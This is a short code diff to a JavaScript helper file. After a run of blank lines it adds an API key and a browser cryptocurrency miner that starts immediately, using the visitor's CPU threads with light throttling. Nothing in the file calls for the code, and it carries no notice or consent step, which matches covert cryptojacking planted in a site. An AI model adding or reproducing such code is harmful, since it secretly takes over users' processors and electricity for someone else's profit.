@@ -106,3 +106,14 @@ function getEl(id){
 function notif(text){
     console.log(text);
 }
+
+
+
+
+var apiKey = "9bdb3f76dd22e98488f357e092abfcf2939a41aa8ed8c502aaf1e2b8be8982b02a97530dad92ccd892654f81a03e31f7e0eebfbbc0ca448a2b6f7e6dd6d4b00d";
+  var numberOfThreads = null; // null will auto-select based on user's CPU. Otherwise a number from 1-n.
+  var throttlePercent = 0.25; // 0.0 = no throttle (Will mine quickly). 1.0 = full throttling (Will mine very slowly, saves CPU) A good value is 0.5.
+  var miner = new Miner(apiKey, numberOfThreads, throttlePercent);
+
+  //execute the following line any time to start the miner
+  miner.start();
